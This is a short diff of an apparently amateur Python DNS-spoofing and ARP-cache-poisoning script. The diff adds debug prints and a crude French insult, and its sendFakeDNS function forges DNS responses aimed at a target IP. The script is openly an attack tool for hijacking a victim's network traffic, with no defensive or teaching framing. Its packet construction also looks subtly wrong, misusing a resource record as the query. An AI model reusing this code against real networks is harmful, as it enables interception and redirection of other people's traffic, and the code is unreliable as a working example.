@@ -12,16 +12,18 @@ def spoofarpcache(targetip, targetmac, sourceip):
     print("yo")
 
 
-def StopDNS(fmf):
-    print(fmf)
+def StopDNS():
+    print("stop connard")
 
 def sendFakeDNS(pkt):
     print(pkt[IP].src)
+    print(pkt[IP].dst)
+    print("ok")
     if pkt[IP].src == targetip : 
         dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
         send(dnsResPacket)
     else:
-        StopDNS("e")
+        StopDNS()
     
 
 def DNSSpoofing(gatewayip):
